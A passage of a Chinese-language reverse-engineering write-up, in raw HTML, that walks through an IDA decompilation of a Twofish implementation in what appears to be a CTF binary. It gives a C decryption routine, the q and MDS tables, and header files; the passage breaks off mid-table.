class="line"></span><br><span class="line">  v2 = sub_402D53(a1, a2 &gt;&gt; <span class="number">3</span>);                 <span class="comment">// key_t* tf_key = expand_key(s, len/8);  拓展密钥</span></span><br><span class="line">  v3 = sub_4025C6(v2);                          <span class="comment">// subkey_t *tf_subkey = Twofish_generate_subkey(tf_key);  生成密钥</span></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">4260u</span>);</span><br><span class="line">  v5 = sub_401B7A(v4, v3, <span class="number">0x1010101</span>, *v2 &gt;&gt; <span class="number">3</span>); <span class="comment">// tf_twofish = Twofish_generate_ext_k_keys(tf_twofish,tf_subkey,0x01010101,(tf_key-&gt;len/8));  生成k</span></span><br><span class="line">  v6 = sub_401CF8(v5, v3, *v2 &gt;&gt; <span class="number">3</span>);            <span class="comment">// tf_twofish = Twofish_generate_ext_s_keys(tf_twofish,tf_subkey,(tf_key-&gt;len/8));  生成s</span></span><br><span class="line">  <span class="built_in">free</span>(v2[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">free</span>(v2);</span><br><span class="line">  <span class="built_in">free</span>(v3);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>拓展密钥</p></blockquote><p><a href="https://i.loli.net/2019/07/25/5d3930a1cc7b017798.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d3930a1cc7b017798.jpg" class="lazyload"></a><br>可以看到题中对位数分析的判定进行了修改</p><blockquote><p>生成密钥</p></blockquote><p><a href="https://i.loli.net/2019/07/25/5d39312bb0d7d18656.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d39312bb0d7d18656.jpg" class="lazyload"></a><br>c实现<a href="https://i.loli.net/2019/07/25/5d3931a257bc836488.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d3931a257bc836488.jpg" class="lazyload"></a></p><p>rsm函数定义为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rsm(i,a,b,c,d,e,f,g,h)  \</span></span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>),a,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">1</span>),b,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">2</span>),c,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">3</span>),d,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">4</span>),e,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">5</span>),f,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">6</span>),g,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">7</span>),h,<span class="number">0x14d</span>)</span><br></pre></td></tr></table></figure></div><blockquote><p>k生成</p></blockquote><p><a href="https://i.loli.net/2019/07/25/5d3931f15177364722.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d3931f15177364722.jpg" class="lazyload"></a><br>h函数内部，可以看出，IDA将二维数组直接一维化<br><a href="https://i.loli.net/2019/07/25/5d39322bb987d21871.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d39322bb987d21871.jpg" class="lazyload"></a></p><p>q0,q1都是256大小的数组<br><a href="https://i.loli.net/2019/07/25/5d3932450ddac91007.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d3932450ddac91007.jpg" class="lazyload"></a><br>标准</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> q[<span class="number">2</span>][<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* q0 */</span></span><br><span class="line">    &#123;<span class="number">0xa9</span>,<span class="number">0x67</span>,<span class="number">0xb3</span>,<span class="number">0xe8</span>,<span class="number">0x4</span>,<span class="number">0xfd</span>,<span class="number">0xa3</span>,<span class="number">0x76</span>,<span class="number">0x9a</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x78</span>,<span class="number">0xe4</span>,<span class="number">0xdd</span>,<span class="number">0xd1</span>,<span class="number">0x38</span>,</span><br><span class="line"><span class="number">0xd</span>,<span class="number">0xc6</span>,<span class="number">0x35</span>,<span class="number">0x98</span>,<span class="number">0x18</span>,<span class="number">0xf7</span>,<span class="number">0xec</span>,<span class="number">0x6c</span>,<span class="number">0x43</span>,<span class="number">0x75</span>,<span class="number">0x37</span>,<span class="number">0x26</span>,<span class="number">0xfa</span>,<span class="number">0x13</span>,<span class="number">0x94</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0xd0</span>,<span class="number">0x8b</span>,<span class="number">0x30</span>,<span class="number">0x84</span>,<span class="number">0x54</span>,<span class="number">0xdf</span>,<span class="number">0x23</span>,<span class="number">0x19</span>,<span class="number">0x5b</span>,<span class="number">0x3d</span>,<span class="number">0x59</span>,<span class="number">0xf3</span>,<span class="number">0xae</span>,<span class="number">0xa2</span>,<span class="number">0x82</span>,</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x1</span>,<span class="number">0x83</span>,<span class="number">0x2e</span>,<span class="number">0xd9</span>,<span class="number">0x51</span>,<span class="number">0x9b</span>,<span class="number">0x7c</span>,<span class="number">0xa6</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0xbe</span>,<span class="number">0x16</span>,<span class="number">0xc</span>,<span class="number">0xe3</span>,<span class="number">0x61</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0x8c</span>,<span class="number">0x3a</span>,<span class="number">0xf5</span>,<span class="number">0x73</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0xb</span>,<span class="number">0xbb</span>,<span class="number">0x4e</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x6a</span>,<span class="number">0xb4</span>,<span class="number">0xf1</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xe6</span>,<span class="number">0xbd</span>,<span class="number">0x45</span>,<span class="number">0xe2</span>,<span class="number">0xf4</span>,<span class="number">0xb6</span>,<span class="number">0x66</span>,<span class="number">0xcc</span>,<span class="number">0x95</span>,<span class="number">0x3</span>,<span class="number">0x56</span>,<span class="number">0xd4</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,<span class="number">0xd7</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0xc3</span>,<span class="number">0x8e</span>,<span class="number">0xb5</span>,<span class="number">0xe9</span>,<span class="number">0xcf</span>,<span class="number">0xbf</span>,<span class="number">0xba</span>,<span class="number">0xea</span>,<span class="number">0x77</span>,<span class="number">0x39</span>,<span class="number">0xaf</span>,<span class="number">0x33</span>,<span class="number">0xc9</span>,<span class="number">0x62</span>,<span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x79</span>,<span class="number">0x9</span>,<span class="number">0xad</span>,<span class="number">0x24</span>,<span class="number">0xcd</span>,<span class="number">0xf9</span>,<span class="number">0xd8</span>,<span class="number">0xe5</span>,<span class="number">0xc5</span>,<span class="number">0xb9</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x8</span>,<span class="number">0x86</span>,<span class="number">0xe7</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0xaa</span>,<span class="number">0xed</span>,<span class="number">0x6</span>,<span class="number">0x70</span>,<span class="number">0xb2</span>,<span class="number">0xd2</span>,<span class="number">0x41</span>,<span class="number">0x7b</span>,<span class="number">0xa0</span>,<span class="number">0x11</span>,<span class="number">0x31</span>,<span class="number">0xc2</span>,<span class="number">0x27</span>,<span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0xf6</span>,<span class="number">0x60</span>,<span class="number">0xff</span>,<span class="number">0x96</span>,<span class="number">0x5c</span>,<span class="number">0xb1</span>,<span class="number">0xab</span>,<span class="number">0x9e</span>,<span class="number">0x9c</span>,<span class="number">0x52</span>,<span class="number">0x1b</span>,<span class="number">0x5f</span>,<span class="number">0x93</span>,<span class="number">0xa</span>,<span class="number">0xef</span>,</span><br><span class="line"><span class="number">0x91</span>,<span class="number">0x85</span>,<span class="number">0x49</span>,<span class="number">0xee</span>,<span class="number">0x2d</span>,<span class="number">0x4f</span>,<span class="number">0x8f</span>,<span class="number">0x3b</span>,<span class="number">0x47</span>,<span class="number">0x87</span>,<span class="number">0x6d</span>,<span class="number">0x46</span>,<span class="number">0xd6</span>,<span class="number">0x3e</span>,<span class="number">0x69</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0xce</span>,<span class="number">0xcb</span>,<span class="number">0x2f</span>,<span class="number">0xfc</span>,<span class="number">0x97</span>,<span class="number">0x5</span>,<span class="number">0x7a</span>,<span class="number">0xac</span>,<span class="number">0x7f</span>,<span class="number">0xd5</span>,<span class="number">0x1a</span>,<span class="number">0x4b</span>,<span class="number">0xe</span>,<span class="number">0xa7</span>,<span class="number">0x5a</span>,</span><br><span class="line"><span class="number">0x28</span>,<span class="number">0x14</span>,<span class="number">0x3f</span>,<span class="number">0x29</span>,<span class="number">0x88</span>,<span class="number">0x3c</span>,<span class="number">0x4c</span>,<span class="number">0x2</span>,<span class="number">0xb8</span>,<span class="number">0xda</span>,<span class="number">0xb0</span>,<span class="number">0x17</span>,<span class="number">0x55</span>,<span class="number">0x1f</span>,<span class="number">0x8a</span>,<span class="number">0x7d</span>,</span><br><span class="line"><span class="number">0x57</span>,<span class="number">0xc7</span>,<span class="number">0x8d</span>,<span class="number">0x74</span>,<span class="number">0xb7</span>,<span class="number">0xc4</span>,<span class="number">0x9f</span>,<span class="number">0x72</span>,<span class="number">0x7e</span>,<span class="number">0x15</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x58</span>,<span class="number">0x7</span>,<span class="number">0x99</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x6e</span>,<span class="number">0x50</span>,<span class="number">0xde</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0xbc</span>,<span class="number">0xdb</span>,<span class="number">0xf8</span>,<span class="number">0xc8</span>,<span class="number">0xa8</span>,<span class="number">0x2b</span>,<span class="number">0x40</span>,<span class="number">0xdc</span>,<span class="number">0xfe</span>,<span class="number">0x32</span>,<span class="number">0xa4</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x10</span>,<span class="number">0x21</span>,<span class="number">0xf0</span>,<span class="number">0xd3</span>,<span class="number">0x5d</span>,<span class="number">0xf</span>,<span class="number">0x0</span>,<span class="number">0x6f</span>,<span class="number">0x9d</span>,<span class="number">0x36</span>,<span class="number">0x42</span>,<span class="number">0x4a</span>,<span class="number">0x5e</span>,<span class="number">0xc1</span>,<span class="number">0xe0</span></span><br><span class="line">&#125;,</span><br><span class="line">    <span class="comment">/* q1 */</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="number">0x75</span>,<span class="number">0xf3</span>,<span class="number">0xc6</span>,<span class="number">0xf4</span>,<span class="number">0xdb</span>,<span class="number">0x7b</span>,<span class="number">0xfb</span>,<span class="number">0xc8</span>,<span class="number">0x4a</span>,<span class="number">0xd3</span>,<span class="number">0xe6</span>,<span class="number">0x6b</span>,<span class="number">0x45</span>,<span class="number">0x7d</span>,<span class="number">0xe8</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x32</span>,<span class="number">0xd8</span>,<span class="number">0xfd</span>,<span class="number">0x37</span>,<span class="number">0x71</span>,<span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x30</span>,<span class="number">0xf</span>,<span class="number">0xf8</span>,<span class="number">0x1b</span>,<span class="number">0x87</span>,<span class="number">0xfa</span>,<span class="number">0x6</span>,<span class="number">0x3f</span>,</span><br><span class="line"><span class="number">0x5e</span>,<span class="number">0xba</span>,<span class="number">0xae</span>,<span class="number">0x5b</span>,<span class="number">0x8a</span>,<span class="number">0x0</span>,<span class="number">0xbc</span>,<span class="number">0x9d</span>,<span class="number">0x6d</span>,<span class="number">0xc1</span>,<span class="number">0xb1</span>,<span class="number">0xe</span>,<span class="number">0x80</span>,<span class="number">0x5d</span>,<span class="number">0xd2</span>,<span class="number">0xd5</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0x84</span>,<span class="number">0x7</span>,<span class="number">0x14</span>,<span class="number">0xb5</span>,<span class="number">0x90</span>,<span class="number">0x2c</span>,<span class="number">0xa3</span>,<span class="number">0xb2</span>,<span class="number">0x73</span>,<span class="number">0x4c</span>,<span class="number">0x54</span>,<span class="number">0x92</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x38</span>,<span class="number">0xb0</span>,<span class="number">0xbd</span>,<span class="number">0x5a</span>,<span class="number">0xfc</span>,<span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x96</span>,<span class="number">0x6c</span>,<span class="number">0x42</span>,<span class="number">0xf7</span>,<span class="number">0x10</span>,<span class="number">0x7c</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x8c</span>,</span><br><span class="line"><span class="number">0x13</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0xc7</span>,<span class="number">0x24</span>,<span class="number">0x46</span>,<span class="number">0x3b</span>,<span class="number">0x70</span>,<span class="number">0xca</span>,<span class="number">0xe3</span>,<span class="number">0x85</span>,<span class="number">0xcb</span>,<span class="number">0x11</span>,<span class="number">0xd0</span>,<span class="number">0x93</span>,<span class="number">0xb8</span>,</span><br><span class="line"><span class="number">0xa6</span>,<span class="number">0x83</span>,<span class="number">0x20</span>,<span class="number">0xff</span>,<span class="number">0x9f</span>,<span class="number">0x77</span>,<span class="number">0xc3</span>,<span class="number">0xcc</span>,<span class="number">0x3</span>,<span class="number">0x6f</span>,<span class="number">0x8</span>,<span class="number">0xbf</span>,<span class="number">0x40</span>,<span class="number">0xe7</span>,<span class="number">0x2b</span>,<span class="number">0xe2</span>,</span><br><span class="line"><span class="number">0x79</span>,<span class="number">0xc</span>,<span class="number">0xaa</span>,<span class="number">0x82</span>,<span class="number">0x41</span>,<span class="number">0x3a</span>,<span class="number">0xea</span>,<span class="number">0xb9</span>,<span class="number">0xe4</span>,<span class="number">0x9a</span>,<span class="number">0xa4</span>,<span class="number">0x97</span>,<span class="number">0x7e</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x66</span>,<span class="number">0x94</span>,<span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0x3d</span>,<span class="number">0xf0</span>,<span class="number">0xde</span>,<span class="number">0xb3</span>,<span class="number">0xb</span>,<span class="number">0x72</span>,<span class="number">0xa7</span>,<span class="number">0x1c</span>,<span class="number">0xef</span>,<span class="number">0xd1</span>,<span class="number">0x53</span>,<span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0x8f</span>,<span class="number">0x33</span>,<span class="number">0x26</span>,<span class="number">0x5f</span>,<span class="number">0xec</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0x49</span>,<span class="number">0x81</span>,<span class="number">0x88</span>,<span class="number">0xee</span>,<span class="number">0x21</span>,<span class="number">0xc4</span>,<span class="number">0x1a</span>,<span class="number">0xeb</span>,<span class="number">0xd9</span>,</span><br><span class="line"><span class="number">0xc5</span>,<span class="number">0x39</span>,<span class="number">0x99</span>,<span class="number">0xcd</span>,<span class="number">0xad</span>,<span class="number">0x31</span>,<span class="number">0x8b</span>,<span class="number">0x1</span>,<span class="number">0x18</span>,<span class="number">0x23</span>,<span class="number">0xdd</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0x2d</span>,<span class="number">0xf9</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x4f</span>,<span class="number">0xf2</span>,<span class="number">0x65</span>,<span class="number">0x8e</span>,<span class="number">0x78</span>,<span class="number">0x5c</span>,<span class="number">0x58</span>,<span class="number">0x19</span>,<span class="number">0x8d</span>,<span class="number">0xe5</span>,<span class="number">0x98</span>,<span class="number">0x57</span>,<span class="number">0x67</span>,<span class="number">0x7f</span>,<span class="number">0x5</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0xaf</span>,<span class="number">0x63</span>,<span class="number">0xb6</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xb7</span>,<span class="number">0x3c</span>,<span class="number">0xa5</span>,<span class="number">0xce</span>,<span class="number">0xe9</span>,<span class="number">0x68</span>,<span class="number">0x44</span>,<span class="number">0xe0</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x2e</span>,<span class="number">0xac</span>,<span class="number">0x15</span>,<span class="number">0x59</span>,<span class="number">0xa8</span>,<span class="number">0xa</span>,<span class="number">0x9e</span>,<span class="number">0x6e</span>,<span class="number">0x47</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0xcf</span>,<span class="number">0xdc</span>,</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0xc9</span>,<span class="number">0xc0</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0xd4</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0x12</span>,<span class="number">0xa2</span>,<span class="number">0xd</span>,<span class="number">0x52</span>,<span class="number">0xbb</span>,<span class="number">0x2</span>,<span class="number">0x2f</span>,<span class="number">0xa9</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0x61</span>,<span class="number">0x1e</span>,<span class="number">0xb4</span>,<span class="number">0x50</span>,<span class="number">0x4</span>,<span class="number">0xf6</span>,<span class="number">0xc2</span>,<span class="number">0x16</span>,<span class="number">0x25</span>,<span class="number">0x86</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x9</span>,<span class="number">0xbe</span>,<span class="number">0x91</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>MDS矩阵运算<br><a href="https://i.loli.net/2019/07/25/5d39335e7c98176996.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d39335e7c98176996.jpg" class="lazyload"></a></p><blockquote><p>S-box生成</p></blockquote><p><a href="https://i.loli.net/2019/07/25/5d3933a271f7034024.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d3933a271f7034024.jpg" class="lazyload"></a></p><blockquote><p>输入白化，循环，输出白化  sub_401626</p></blockquote><p><a href="https://i.loli.net/2019/07/25/5d39363aca3b346223.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d39363aca3b346223.jpg" class="lazyload"></a></p><p>c实现<br><a href="https://i.loli.net/2019/07/25/5d393666d494e15914.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d393666d494e15914.jpg" class="lazyload"></a></p><p>f函数<br><a href="https://i.loli.net/2019/07/25/5d39463d2a01720818.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d39463d2a01720818.jpg" class="lazyload"></a></p><h2 id="算法解密"><a href="#算法解密" class="headerlink" title="算法解密"></a>算法解密</h2><p>解密函数如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^pack(cypher);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^pack(cypher+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^pack(cypher+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^pack(cypher+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">15</span>; i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = (rol(r2,<span class="number">1</span>)^f0);</span><br><span class="line">        c3 = ror((f1^r3),<span class="number">1</span>);</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^c3;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i]   = unpack(r0,i);</span><br><span class="line">        data[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        data[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        data[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>因此TwoFish加解密代码如下</p><p>twofish.h</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __TWOFISH__H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __TWOFISH__H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdint.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TWOFISH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  TWOFISH</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">twofish_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> s[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125;<span class="keyword">twofish_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish MDS Multiply Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   data</span></span><br><span class="line"><span class="comment"> * @param   cypher</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_encryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *data, <span class="keyword">uint8_t</span> *cypher)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Decryption Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @paramtf_twofish</span></span><br><span class="line"><span class="comment"> * @param   cypher</span></span><br><span class="line"><span class="comment"> * @param   data</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span class="keyword">uint8_t</span> *data)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Setup Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   len</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">twofish_t</span>*  <span class="title">Twofish_setup</span><span class="params">(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></div><p>tables.h</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">ifndef</span> __TABLES__H</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> __TABLES__H</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* The MDS Matrix */</span></span><br><span class="line"> <span class="keyword">uint8_t</span> mds[<span class="number">4</span>][<span class="number">4</span>]=</span><br><span class="line"> &#123;</span><br><span class="line">    &#123;<span class="number">0x01</span>, <span class="number">0xef</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x5b</span>, <span class="number">0xef</span>, <span class="number">0xef</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xef</span>, <span class="number">0x5b</span>, <span class="number">0x01</span>, <span class="number">0xef</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xef</span>, <span class="number">0x01</span>, <span class="number">0xef</span>, <span class="number">0x5b</span>&#125;</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">uint8_t</span> q[<span class="number">2</span>][<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* q0 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line"><span class="number">0xa9</span>,<span class="number">0x67</span>,<span class="number">0xb3</span>,<span class="number">0xe8</span>,<span class="number">0x4</span>,<span class="number">0xfd</span>,<span class="number">0xa3</span>,<span class="number">0x76</span>,<span class="number">0x9a</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x78</span>,<span class="number">0xe4</span>,<span class="number">0xdd</span>,<span class="number">0xd1</span>,<span class="number">0x38</span>,</span><br><span class="line"><span class="number">0xd</span>,<span class="number">0xc6</span>,<span class="number">0x35</span>,<span class="number">0x98</span>,<span class="number">0x18</span>,<span class="number">0xf7</span>,<span class="number">0xec</span>,<span class="number">0x6c</span>,<span class="number">0x43</span>,<span class="number">0x75</span>,<span class="number">0x37</span>,<span class="number">0x26</span>,<span class="number">0xfa</span>,<span class="number">0x13</span>,<span class="number">0x94</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0xd0</span>,<span class="number">0x8b</span>,<span class="number">0x30</span>,<span class="number">0x84</span>,<span class="number">0x54</span>,<span class="number">0xdf</span>,<span 